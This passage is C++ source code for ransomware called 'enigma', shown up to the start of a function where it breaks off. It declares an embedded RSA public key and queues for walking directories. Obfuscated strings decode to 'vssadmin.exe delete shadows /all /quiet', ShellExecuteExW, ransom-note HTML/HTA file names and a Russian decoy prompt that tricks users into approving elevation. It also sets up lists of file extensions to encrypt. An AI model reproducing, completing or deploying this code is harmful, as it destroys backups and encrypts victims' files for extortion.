// enigma.cpp : main project file.

#include "enigma.h"

Concurrency::concurrent_queue<std::string> directories_queue; //dirs to walk
Concurrency::concurrent_queue<std::string> found_files_queues[4]; //docs, 


std::string InnerDecrypt(const std::string& input, size_t offset = 2);

int total_encrypted_counter;
const unsigned char kRsaPublicKey[] =
{
  0x06, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x52, 0x53,
  0x41, 0x31, 0x00, 0x02, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
  0x39, 0x1F, 0xA7, 0x28, 0x79, 0xBA, 0x63, 0xEE, 0x38, 0xA2,
  0xF4, 0x5B, 0x6D, 0x68, 0x87, 0x7B, 0x6E, 0xBB, 0xC3, 0x69,
  0xC3, 0x56, 0x8C, 0x51, 0x32, 0xDA, 0xC6, 0xB9, 0xAF, 0x9A,
  0x85, 0x5B, 0x55, 0xAD, 0x33, 0x6C, 0x7E, 0x0F, 0x96, 0x07,
  0x68, 0x15, 0x5D, 0x25, 0x88, 0x01, 0xF4, 0xFD, 0x8B, 0x9C,
  0x2F, 0x22, 0xFB, 0x31, 0x5E, 0xF0, 0xEC, 0x84, 0xBE, 0x71,
  0x82, 0xD6, 0x1A, 0xA2
};


static const char secondAlphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ";
static wchar_t rsa_hash_wchar[10];
static char rsa_hash[19]; //will be used as wchar_t in enigma_crypt1
static const std::string user32{ InnerDecrypt("vv+%*v+C%%%CC(*Y*$*$") }; //user32.dll
static const std::string shell32{ InnerDecrypt("v%*K*v*$*$%%%CC(*Y*$*$") }; //shell32.dll
static const std::string shell_exec{ InnerDecrypt("v%*K*v*$*$Yv+K*v*%+v+Y*vYv+Kv+") };  //ShellExecuteExW
static const std::string vssAdmCommand{ InnerDecrypt("+*+%+%*t*Y*;*N*(C(*v+K*vCx*Y*v*$*v+Y*vCx+%*K*t*Y*-+++%CxC-*t*$*$CxC-+t+v*N*v+Y") }; //vssadmin.exe delete shadows /all /quiet
static const std::string falconStr{ InnerDecrypt("***t*$*%*-*(%NC(***t*$*%*-*(") }; //falcon9.falcon
static const std::string aEnigma{ InnerDecrypt("YvY(YNY+Y;Yt") };//ENIGMA
static const std::string aRsa{ InnerDecrypt("C(vCv%Yt") };//.RSA
static const std::string i_hate_c{ InnerDecrypt("*N*K*t+Y*v*%") };//ihatec
static const std::string firstMark{ "[PATHTODECSTOPRSA]" }; //[PATHTODECSTOPRSA]
static const std::string secondMark{ "[PATHTOTMPRSA]" };//[PATHTOTMPRSA]
static const std::string htaMark{ InnerDecrypt("v,YKvYYtvYYvvKvYv;") }; //[HTATEXT]
static const std::string html_file_name{ InnerDecrypt("*v*(*N*+*;*tv-*v*(*%+CC(*K+Y*;*$") }; //enigma_encr.html
static const std::string kernel32{ InnerDecrypt("*,*v+C*(*v*$%%%CC(*Y*$*$") }; //kernel32.dll
static const std::string js_file_name{ InnerDecrypt("*v*(*N*+*;*tC(*K+Y*t") };//enigma.hta
static const std::string mark_737{ "737" }; //Crypto salt
static const std::string decoyMessage1{ InnerDecrypt("$C-,Cx-%-t(-(v-K(;((Cx(((t(;(((C(,(v(;-,C(Cx;+-C(((t-,Cx-t((-v-x(x(;(K-C-$Cx(;(x(*($(K-C(vCx(Y(x") }; //Вы успешно обновлены. Чтобы сохранить нажмите да
static const std::string workstatistic_file_name = ""; //URI to workstatistic
static const std::string work_statistic{ InnerDecrypt("++*-+C*,+%+Y*t+Y*N+%+Y*N*%C(*Y*t+Y") }; //workstatistic.dat
static const std::string dot_enigma{ InnerDecrypt("C(*v*(*N*+*;*t") }; // .enigma
static const int chunkSize = 40; //used in encryption
static std::string htmlBody{ base64_decode(InnerDecrypt("vxY+*K%x*Cv+++C,Y%*NYt*+vxY+*K*$vNv+vtC,Y%*NYt*+YNY%Yt%K*tYKvC*KY-*;Y*++*%Y++K+xvN%CY*%x*tv+%N+vYNYv*$YYvY%x%Y%NYN*;vm*K*Y*;*$*m*C%C%Y+v*tv+Y(+*YN*NYCY%vY%tYmYvvCv*YN*+vxv%Yt*N*C*;%N+vvmv%YN*+vt%xY*vtv*Yv*$vxvY*NYt%NYNY%YmY-*C+NYN*+vt%x%NY-v*Yvv*vNv*Yv%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*NYCYmvY*,%vY*vv*,Ymvxvv*,vCY*vv*NYt%NYNY%YmY-*C+NYN*+vYvvY*vNv%vv%tYmv+*,v*Y%v*v*vCvvvY%x%Y*+vxv%Yt*NvY*;%K*NYNYv%tYmvY*,*$Y(v%v*+xY*vt*$v*vvv*Yv%NY-YNYY%x*+YN*,%v+*YN*NYCY-vtv*vmYmvC%xY*Y%vYYvvv*+vxv%Yt*Nv+v+v*+mYN*NYCvYvt%tYmvxvYYv++*+vxv%Yt*NvY*;%K*NYNY*Y(YYvv*,%NY;vYYvvmY;vtv*vt*+vxv%Yt*NvY*;%K*NYNY*Y(Y*vYYvv*YYv*Yv*$vxvY*NYt%NYNY%YmvmvmvKY;*NYNY*Y(YNvY%t*YYmvY*$vCYCvv%x+YY%vtv*YN*+vxv%Yt*Nv+v+v*+mYN*NYCvYv%vv%vYKvYYvv*YmvY*$Y(vvvtvv%vYYvCv%Yt%NYNY%YmvmvmvKY;*NYNY*Y(vmvv%x%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*N%KC,Y%*NYt*+YNY%Yt*+vxYKY(%x*vv++K*$vx*;Ym+*vmYK*$%+vN%%v*+N*%%C%N+NY-*;vC*$vm*;Y*%t*CYKvt%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t*m*C%C+K+**%*m*-*mvCvY*YY*Y(%xvv%%Y-%C%t*K*%*;*Y+x*C*m*-++Y-%Cvm+**C*(vt+Yvm*;Y*+Y*tv++K%vY-*NYmYNvmv++K%CvmvKvC+xvN%CY*Y-vmvKv**$Y$vv+K+xvm%C*K%xYN*N++*Nv%Y+v*+%*Y*;v*%x*tv+Y(*KYNYv%v*$*Yv+vv*+vYY+*$*(*tYKvt*NY$Y%YmYNvmv++K%CvmvKvC+xvN%CYv*+vY*;v*%tvmv%YN+%v%Y+v*+%*Y*;v*%x*tv+Y(*KY$YvY*+N*tv+Y*+%Y$YKY(*K*C*(Y;+Y*%%Cv*+N*tv+vN%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+Y$*(vm*K*YvKY(%x*vv++K*$*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YY-%C*K*$*tv+*Y*-*YYY*-%tY;*mYC++*vYY+Y%%*tv+vC%x*tYY*-+KY;vYYt++*%YK*K%NY$*(Y(*m*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YYNYYYv%tY;YKYC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-%xY;YKYC%YY-%%*Y+xvmYKvC*-Y-*m*,++Y;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%%vNvY*Y*KY(%CYv%+vN%C%N+%*C%%YN%*YN%xvmY+Y(YvY;%xvt+m+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+*$+YvNv+*Y*$Y-*(v*+N*CY%*K*,vNvKvC*KY-*;*$+YvNv+*Y*$Y$%%YC+vvm+m+Y*NvNvKY(*$Y(*mvt+%*tv*vmY%vY%tYm%%Y;Yv+YYKvm%C%NYCvtvvY*YCvY*$Y(v**tYvv*v*vm%xY*YCvtvvY*v*vtvvY*YCvtvvvmYYvtv**$YCvtvvY*YYvY*;Ym%vvN*;+KYCvtvvY*YCv%*mYC+%vCv*Y*v+vv*mvt+N*Cv**KY(*%%tY*+CvtvvY*YC*v*,vCY(v%Y%+YvYY$+mvN%vvYvYvmv+vtv+%N*$vtv+*YYKvCY*Y*Y+v%v**%+*Y(Y*Y*vCvtv*Ym*N*Y%CY*Y+Y,%xYN+mY,%tY(vtvC%xY*+*Y-Y+Ym+%vm%xY*YCvtvvY*YCvCv++KY+v*Y++YvY*Yv*Y*+Yvt%xY;+x**v%%v*N*%*;*$*$vm*;+K%v*v%%YC+**%%C*$%x*tv+%N+vY-*;Y**N*%%C%N+%*YvKvC*$Y-%C+K*$vm*(vt%*Y(vYYC++*vYY+Y%%*tv+vC%x*tYY*-%xY-YYYC++*vYK%x+vvmY+v*%xvNv+*$+%vmv+vC%+vmY+*$+m*%Y++K*K*vvY+x+x*C*;+K+x*C*;vv+YvN*;+K+*vN%C+%%+*Cv+Y*+Nvm%C*$+vY$v++K*$vm*(vt%*Y(vYY;++*%YK*+%+*Y%C*$*,*YY+*+%*Y(*mvN++*%YK*K%NY$*;Ym%x*tvK+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY(YvvC*,vCY+vCYvvN%+vN%C%N+%*C%%YN%*YN+mvv%tY(vY+Y*;*C%C%v%xY$vKY(+x*v*;vv%*Y;*m*K++*vYY+Y++vNv+vC*,*tv+%v*(Y-*mYv++*%YK*K%N*tYKYm%+*Y%C*$*,*YY+*+%*Y-vYYt*$YmvK%x+v*%%CY(*$vmYK+Y+YvNvKYm*(*tv+%Y+Y*YY+%N++Y-*mYv%t*%YK*+%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN%%*%YK*+%+*tY+v*+xvm%C*K%xY-*mYN+NY;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%CvNvYvm*KY(*;Yv%+*CY+*$+vvmv%%t*-vmv+*$*(*tYKvt%*Y;v%%Y%tY-%CY(+**CY+%N+NY-*NY(Y*vtvvv*YCvCvvYv%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t+x*Cv+Y**(vmvY+x%t*%*;++*-vmY+Y*%xvNvY+x+x*Cv+Y**(vmv%%N++*C*;*%%+vN*;Y*+mvmvYvN%xY$Y+*$v+vt*,%Nv%*Y+mYCY$vC%C*Y+*vtvvY*YCvtvv%vvYv*v+*KY*v*v+*YYCvtvvY*YCv*vvY*YCvtvvY*Y+vt%xY*vmvtvvY*YCvt%x%v*N*vv+Ym+%vtvvY*YCvtvv*-++*CYvv*vCv**$YN%xY;*;%tvNvYvKY(vC*t%xY*YCvtvK+xYvvYvv*++Cvv+N%K%CY-vv%x%Cv**,Y*+*vmvvY**(vC%xvCvCvC*,*$vKY$+mvCvCvvvvY*v%vN*(*Y*KvC*N+YY%Y;+N+YvYvvYv*YYC*C+m*K*N*CY+*YYCvtvvY*YCvtvvv*+%vC*$vC+Cvv%%v*vC*CvvY(YYY,vK%t*;*C%%Ym+Y*v%CvC+x*%%%YC+%vNvK*,%**tv+%v+%*tv+%v*$**v%%v*,vN*(v*%x*YYK+Y+YvNvKYm*(*tv+%Y+Y*CY+v**;*YYY*-+N*%YK*+%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYv%C*%YK*+%+vm*;%N+v*YY%%t%%vmv+*$*(*tYKvt%*Y(vYYt++Y-%CYm+**%*;vC*$*%*m+x+v*C%C%v*$Y-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN+m*$*;Y-v+vN%vvm*m+Y*m*C%C+K+**%*m*-*mvCvvv*Y*Y-%CY(%t*%*(Y(+**%*m+x++*C%C*$+v*YY+v*+N**v%%v*;*C%C%N%xvmvKYm%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x+%vmv+vm%xY-%%YC+**%%C*$%x*tv+%N+vY-*(Ym*$*CY+Y*%x*tvKvm*$Y-%%*Y+xvmYKvC*-Y-*mvN++Y;YKYC%YY-%C%t*K*%*;*Y+x*C*m*-+N*%YK*+*+Y;*(YC%YYNYYYm++*vY%Yt%xY(vKYC%YY-%C*K*$*tv+*Y*-*YYY*-+KY(*(YC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-+KY(vKYC%YY-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN%xY(Y+vt%xvmYYvC*m+Y*m*C%C+K+**%*m*-*mY(YYvt%xY-%%YC*KvmY+vC+x*C*;*%%*Y(*(YC%Y**v%%v*;*C*;+K%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN+K*%YK*K%NY%*NYt*+YNY%Yt*+YNYY+++**%%%vC%v*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+YvmvKvC*KYNY+*K%x*YYKYt+YvmvKY*%t*tvKvN%NYN*,Y(+**C*(vC*$*C*(vt+Yv*YK*$++vmv%YN*+vN%C%N+v*YY+v*+v*YYY%x*N*YY+v*%Y*YY%%N*-*YY+%t+%Y-%CY(*-vNvKYm+mvmvKvt%N*YvKvC*;Y$vY*+*NY$+m%YY,YNY%Yt*+YNY%Yt*+vxYKvC+x*YY++K*$vx*m+++**YY+*$%x*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+mvN%%Ym+x*%YKvt*+*CY+Y*+vvm%%v**Kvm%Cvv%NYN*(vm*N*%%CY(+N*tvKYC%xYN*m%YY,YNY%Yt*+YNY%Yt*+YNY%YC+m*Yv+YN*+v*%C*$+vvmY+%N%%vK%x%N+v*CY+%N*KvmYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+NvmvKY(+x*v*;v*vv*C+NYt+KY;*m*+++Y$YY*%+NY(vt*-*+YNY%Yt*+YNY%Yt*+YNYKY(*m*%*;v**$*C*$*Y+xvmYKvC*-YNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CY**Y+xvmYKvC*-Y%*NYt*+YNY%Yt*+YNY%Yt*+*%%CY(+Nvmv+v*+vv%Y+v*+xvm%C*K%xYNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CYv*K*$*tv+*Y*-*YYt*-*+YNY%Yt*+YNY%Yt*+YNYKYC+**%%x+K*$vm*(vt*+vxv%Yt*-*%%CY(+Nvmv+v*+vv*%C*$*,*YY+*+*+Y$v%Yt+KY;*m*+++Y,v%Yt+*YNYYYN*+Y%*NYt*+YNY%Yt*+YNY%Yt*+*%Y+%N+mv*Y+%N++YNYY%x*+Y,YKY(*m*%*;v**$*C*,*K*$*tv+*Y*-*YY%Yt+YYNYY*%+NY(v%*,*+Y$+NYt+NYNYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+Y*C%%vm*$v*Y+%K*+*%Y+%N+mvYY+v**;*YY%++*+*%Y+%N+mv*Y+%N++YNYt*-*+YNY%Yt*+YNY%Yt*+YNY+v*+vvmY%YC+m*Yv+YN*+Y%*NYt*+YNY%Yt*+YNYY+++**%%CY(+N*tvKYC%xvx*+*-*+YNYY+++**tY+v**KvmYY%YY,YNY%Yt%KvN*;%N*,*vv%YC+mvN%%Ym+**CY+++%NYN*;%v+*YN*m%YY,v+%x*Kvvvtv*vCY*v+Y*vC*YY%*NYt*+vxY%%N*N*C%CvC%vvx*+*-%KY$%C*K%x*Cv+++C,\x00")) };
static std::string htmlHead{ base64_decode(InnerDecrypt("vxY+*K%x*Cv+++C,Y%*NYt*+vxY+*K*$vNv+vtC,Y%*m+K+YvmvKvC*KYNY+Y(*-vNvKYm+mvmvKvt%NYN*$v*vvvC*N%x%YYN*m%YY,YNY%Yt%K*YY+*$%x*CY+vvC,vCv+%v+xvm%C%t*KvxY%%N%x*tvKvC+%vmvY%YY,YNY%Yt%KY$%C*K*$vNv+vtC,Y%*NYt*+vxY+Ym+*vmYK*,C,Y%*NYt*+v+%x*Kvvvtv*vCY*v+Y*vC*YY%*NYt*+vxY%%N*N*C%CvC%vvx*+*-*+YNYY+++**tYKvC+Y*CYY%Y%;\x00")) };
static std::string htmlJS{ base64_decode(InnerDecrypt("vxY+*K%x*Cv+++C,Y%*NYt*+vxY+*K*$vNv+vtC,Y%*NYt*+YNY%Yt%K*tYKvC*KY-*;Y*++*%Y++K+xvN%CY*%x*tv+%N+vYNYv*$YYvY%x%Y%NYN*;vm*K*Y*;*$*m*C%C%Y+v*tv+Y(+*YN*NYCY%vY%tYmYvvCv*YN*+vxv%Yt*N*C*;%N+vvmv%YN*+vt%xY*vtv*Yv*$vxvY*NYt%NYNY%YmY-*C+NYN*+vt%x%NY-v*Yvv*vNv*Yv%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*NYCYmvY*,%vY*vv*,Ymvxvv*,vCY*vv*NYt%NYNY%YmY-*C+NYN*+vYvvY*vNv%vv%tYmv+*,v*Y%v*v*vCvvvY%x%Y*+vxv%Yt*NvY*;%K*NYNYv%tYmvY*,*$Y(v%v*+xY*vt*$v*vvv*Yv%NY-YNYY%x*+YN*,%v+*YN*NYCY-vtv*vmYmvC%xY*Y%vYYvvv*+vxv%Yt*Nv+v+v*+mYN*NYCvYvt%tYmvxvYYv++*+vxv%Yt*NvY*;%K*NYNY*Y(YYvv*,%NY;vYYvvmY;vtv*vt*+vxv%Yt*NvY*;%K*NYNY*Y(Y*vYYvv*YYv*Yv*$vxvY*NYt%NYNY%YmvmvmvKY;*NYNY*Y(YNvY%t*YYmvY*$vCYCvv%x+YY%vtv*YN*+vxv%Yt*Nv+v+v*+mYN*NYCvYv%vv%vYKvYYvv*YmvY*$Y(vvvtvv%vYYvCv%Yt%NYNY%YmvmvmvKY;*NYNY*Y(vmvv%x%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*N%KC,Y%*NYt*+YNY%Yt*+vxYKY(%x*vv++K*$vx*;Ym+*vmYK*$%+vN%%v*+N*%%C%N+NY-*;vC*$vm*;Y*%t*CYKvt%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t*m*C%C+K+**%*m*-*mvCvY*YY*Y(%xvv%%Y-%C%t*K*%*;*Y+x*C*m*-++Y-%Cvm+**C*(vt+Yvm*;Y*+Y*tv++K%vY-*NYmYNvmv++K%CvmvKvC+xvN%CY*Y-vmvKv**$Y$vv+K+xvm%C*K%xYN*N++*Nv%Y+v*+%*Y*;v*%x*tv+Y(*KYNYv%v*$*Yv+vv*+vYY+*$*(*tYKvt*NY$Y%YmYNvmv++K%CvmvKvC+xvN%CYv*+vY*;v*%tvmv%YN+%v%Y+v*+%*Y*;v*%x*tv+Y(*KY$YvY*+N*tv+Y*+%Y$YKY(*K*C*(Y;+Y*%%Cv*+N*tv+vN%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+Y$*(vm*K*YvKY(%x*vv++K*$*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YY-%C*K*$*tv+*Y*-*YYY*-%tY;*mYC++*vYY+Y%%*tv+vC%x*tYY*-+KY;vYYt++*%YK*K%NY$*(Y(*m*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YYNYYYv%tY;YKYC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-%xY;YKYC%YY-%%*Y+xvmYKvC*-Y-*m*,++Y;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%%vNvY*Y*KY(%CYv%+vN%C%N+%*C%%YN%*YN%xvmY+Y(YvY;%xvt+m+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+*$+YvNv+*Y*$Y-*(v*+N*CY%*K*,vNvKvC*KY-*;*$+YvNv+*Y*$Y$%%YC+vvm+m+Y*NvNvKY(*$Y(*mvt+%*tv*vmY%vY%tYm%%Y;Yv+YYKvm%C%NYCvtvvY*YCvY*$Y(v**tYvv*v*vm%xY*YCvtvvY*v*vtvvY*YCvtvvvmYYvtv**$YCvtvvY*YYvY*;Ym%vvN*;+KYCvtvvY*YCv%*mYC+%vCv*Y*v+vv*mvt+N*Cv**KY(*%%tY*+CvtvvY*YC*v*,vCY(v%Y%+YvYY$+mvN%vvYvYvmv+vtv+%N*$vtv+*YYKvCY*Y*Y+v%v**%+*Y(Y*Y*vCvtv*Ym*N*Y%CY*Y+Y,%xYN+mY,%tY(vtvC%xY*+*Y-Y+Ym+%vm%xY*YCvtvvY*YCvCv++KY+v*Y++YvY*Yv*Y*+Yvt%xY;+x**v%%v*N*%*;*$*$vm*;+K%v*v%%YC+**%%C*$%x*tv+%N+vY-*;Y**N*%%C%N+%*YvKvC*$Y-%C+K*$vm*(vt%*Y(vYYC++*vYY+Y%%*tv+vC%x*tYY*-%xY-YYYC++*vYK%x+vvmY+v*%xvNv+*$+%vmv+vC%+vmY+*$+m*%Y++K*K*vvY+x+x*C*;+K+x*C*;vv+YvN*;+K+*vN%C+%%+*Cv+Y*+Nvm%C*$+vY$v++K*$vm*(vt%*Y(vYY;++*%YK*+%+*Y%C*$*,*YY+*+%*Y(*mvN++*%YK*K%NY$*;Ym%x*tvK+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY(YvvC*,vCY+vCYvvN%+vN%C%N+%*C%%YN%*YN+mvv%tY(vY+Y*;*C%C%v%xY$vKY(+x*v*;vv%*Y;*m*K++*vYY+Y++vNv+vC*,*tv+%v*(Y-*mYv++*%YK*K%N*tYKYm%+*Y%C*$*,*YY+*+%*Y-vYYt*$YmvK%x+v*%%CY(*$vmYK+Y+YvNvKYm*(*tv+%Y+Y*YY+%N++Y-*mYv%t*%YK*+%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN%%*%YK*+%+*tY+v*+xvm%C*K%xY-*mYN+NY;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%CvNvYvm*KY(*;Yv%+*CY+*$+vvmv%%t*-vmv+*$*(*tYKvt%*Y;v%%Y%tY-%CY(+**CY+%N+NY-*NY(Y*vtvvv*YCvCvvYv%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t+x*Cv+Y**(vmvY+x%t*%*;++*-vmY+Y*%xvNvY+x+x*Cv+Y**(vmv%%N++*C*;*%%+vN*;Y*+mvmvYvN%xY$Y+*$v+vt*,%Nv%*Y+mYCY$vC%C*Y+*vtvvY*YCvtvv%vvYv*v+*KY*v*v+*YYCvtvvY*YCv*vvY*YCvtvvY*Y+vt%xY*vmvtvvY*YCvt%x%v*N*vv+Ym+%vtvvY*YCvtvv*-++*CYvv*vCv**$YN%xY;*;%tvNvYvKY(vC*t%xY*YCvtvK+xYvvYvv*++Cvv+N%K%CY-vv%x%Cv**,Y*+*vmvvY**(vC%xvCvCvC*,*$vKY$+mvCvCvvvvY*v%vN*(*Y*KvC*N+YY%Y;+N+YvYvvYv*YYC*C+m*K*N*CY+*YYCvtvvY*YCvtvvv*+%vC*$vC+Cvv%%v*vC*CvvY(YYY,vK%t*;*C%%Ym+Y*v%CvC+x*%%%YC+%vNvK*,%**tv+%v+%*tv+%v*$**v%%v*,vN*(v*%x*YYK+Y+YvNvKYm*(*tv+%Y+Y*CY+v**;*YYY*-+N*%YK*+%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYv%C*%YK*+%+vm*;%N+v*YY%%t%%vmv+*$*(*tYKvt%*Y(vYYt++Y-%CYm+**%*;vC*$*%*m+x+v*C%C%v*$Y-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN+m*$*;Y-v+vN%vvm*m+Y*m*C%C+K+**%*m*-*mvCvvv*Y*Y-%CY(%t*%*(Y(+**%*m+x++*C%C*$+v*YY+v*+N**v%%v*;*C%C%N%xvmvKYm%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x+%vmv+vm%xY-%%YC+**%%C*$%x*tv+%N+vY-*(Ym*$*CY+Y*%x*tvKvm*$Y-%%*Y+xvmYKvC*-Y-*mvN++Y;YKYC%YY-%C%t*K*%*;*Y+x*C*m*-+N*%YK*+*+Y;*(YC%YYNYYYm++*vY%Yt%xY(vKYC%YY-%C*K*$*tv+*Y*-*YYY*-+KY(*(YC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-+KY(vKYC%YY-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN%xY(Y+vt%xvmYYvC*m+Y*m*C%C+K+**%*m*-*mY(YYvt%xY-%%YC*KvmY+vC+x*C*;*%%*Y(*(YC%Y**v%%v*;*C*;+K%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN+K*%YK*K%NY%*NYt*+YNY%Yt*+YNYY+++**%%%vC%v*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+YvmvKvC*KYNY+*K%x*YYKYt+YvmvKY*%t*tvKvN%NYN*,Y(+**C*(vC*$*C*(vt+Yv*YK*$++vmv%YN*+vN%C%N+v*YY+v*+v*YYY%x*N*YY+v*%Y*YY%%N*-*YY+%t+%Y-%CY(*-vNvKYm+mvmvKvt%N*YvKvC*;Y$vY*+*NY$+m%YY,YNY%Yt*+YNY%Yt*+vxYKvC+x*YY++K*$vx*m+++**YY+*$%x*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+mvN%%Ym+x*%YKvt*+*CY+Y*+vvm%%v**Kvm%Cvv%NYN*(vm*N*%%CY(+N*tvKYC%xYN*m%YY,YNY%Yt*+YNY%Yt*+YNY%YC+m*Yv+YN*+v*%C*$+vvmY+%N%%vK%x%N+v*CY+%N*KvmYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+NvmvKY(+x*v*;v*vv*C+NYt+KY;*m*+++Y$YY*%+NY(vt*-*+YNY%Yt*+YNY%Yt*+YNYKY(*m*%*;v**$*C*$*Y+xvmYKvC*-YNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CY**Y+xvmYKvC*-Y%*NYt*+YNY%Yt*+YNY%Yt*+*%%CY(+Nvmv+v*+vv%Y+v*+xvm%C*K%xYNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CYv*K*$*tv+*Y*-*YYt*-*+YNY%Yt*+YNY%Yt*+YNYKYC+**%%x+K*$vm*(vt*+vxv%Yt*-*%%CY(+Nvmv+v*+vv*%C*$*,*YY+*+*+Y$v%Yt+KY;*m*+++Y,v%Yt+*YNYYYN*+Y%*NYt*+YNY%Yt*+YNY%Yt*+*%Y+%N+mv*Y+%N++YNYY%x*+Y,YKY(*m*%*;v**$*C*,*K*$*tv+*Y*-*YY%Yt+YYNYY*%+NY(v%*,*+Y$+NYt+NYNYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+Y*C%%vm*$v*Y+%K*+*%Y+%N+mvYY+v**;*YY%++*+*%Y+%N+mv*Y+%N++YNYt*-*+YNY%Yt*+YNY%Yt*+YNY+v*+vvmY%YC+m*Yv+YN*+Y%*NYt*+YNY%Yt*+YNYY+++**%%CY(+N*tvKYC%xvx*+*-*+YNYY+++**tY+v**KvmYY%YY,YNY%Yt%KvN*;%N*,*vv%YC+mvN%%Ym+**CY+++%NYN*;%v+*YN*m%YY,v+%x*Kvvvtv*vCY*v+Y*vC*YY%*NYt*+vxY%%N*N*C%CvC%vvx*+*-%KY$%C*K%x*Cv+++C,\x00")) };
static std::string formatted_mac_string{ "" }; //global formatted mac string
static std::wstring temp_path; //path to temp
static std::string enigma_dot_rsa; //ENIGMA.RSA
static std::wstring temp_file;
static std::wstring desktop_dir;
static std::string derived_key{ "" }; //key derived from mac + 18 random bytes and encrypted with EncryptRsa
static std::vector<std::wstring> doc_exts_vector;//documents extensions
static std::vector<std::wstring> script_exts_vector; //scripts extensions
static std::vector<std::wstring> archive_exts_vector;
static std::vector<std::wstring> media_exts_vector;
static std::vector<std::wstring> directories;
static std::vector<std::wstring> backup_exts_vector;
static std::vector<std::wstring> all_extensions; //first 4 in here
static std::vector<int> vector_filetype_count; //files counter, used in enigmaThread1
static std::vector<std::string> files_to_encode; //files to encode vector, used in enigmaThread1
std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
uint32_t enigma_dot_rsa_newlines;
static bool no_more_files = false; //interthread var, no sync
static bool file_coding_thread_not_finished = true; //interthread var, no sync
static bool shadowCopyOff = 0; //shadow copying was turned off in thread
static bool finished = false; //finished flag, set in main thread
static int files_found = 0; //total files affected counter

void FillBackupExts() {
  /*
